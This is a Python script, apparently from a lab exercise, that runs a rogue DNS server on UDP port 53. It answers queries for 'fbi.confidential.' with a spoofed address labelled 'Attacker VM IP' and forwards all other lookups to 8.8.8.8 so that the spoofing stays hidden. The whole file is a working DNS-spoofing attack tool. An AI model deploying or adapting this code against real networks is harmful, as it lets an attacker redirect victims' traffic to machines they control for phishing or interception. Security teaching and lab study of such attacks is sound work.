import socketserver
from dnslib import DNSRecord, DNSHeader, DNSQuestion, RR, A

# IP of public recursive DNS server
FORWARDER_IP = "8.8.8.8"

# Local DNS spoofing records
DNS_RECORDS = {
    "fbi.confidential.": "10.0.0.50"  # Attacker VM IP
}


def normalize(name: str) -> str:
    """
    Normalize qname so that it always:
    - is lowercase
    - ends with a dot
    """
    name = str(name).lower()
    if not name.endswith("."):
        name += "."
    return name


class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data, client_socket = self.request

        try:
            # Parse request
            request = DNSRecord.parse(data)
            question = request.q
            qname = normalize(question.qname)

            print(f"Received DNS request for {qname}")

            # Local spoofing case
            if qname in DNS_RECORDS:
                spoof_ip = DNS_RECORDS[qname]
                print(f"[GREEN] Local match found → Spoofing {qname} to {spoof_ip}")

                reply = request.reply()
                reply.add_answer(RR(qname, rdata=A(spoof_ip), ttl=60))

                client_socket.sendto(reply.pack(), self.client_address)
                return

            # Forward to real DNS
            print(f"[RED] Not in local records → Forwarding to {FORWARDER_IP}")
            proxy_request = DNSRecord.parse(data)
            response = proxy_request.send(FORWARDER_IP, 53, "udp")

            client_socket.sendto(response, self.client_address)

        except Exception as e:
            print(f"Error handling DNS request: {e}")


if __name__ == "__main__":
    server_address = ('', 53)

    print(f"DNS Server running on :53")
    print("Local records:")
    for domain, ip in DNS_RECORDS.items():
        print(f"  {domain} -> {ip}")

    try:
        server = socketserver.UDPServer(server_address, DNSHandler)
        server.serve_forever()

    except PermissionError:
        print("Permission denied: run with sudo.")
    except Exception as e:
        print(f"Error starting DNS server: {e}")
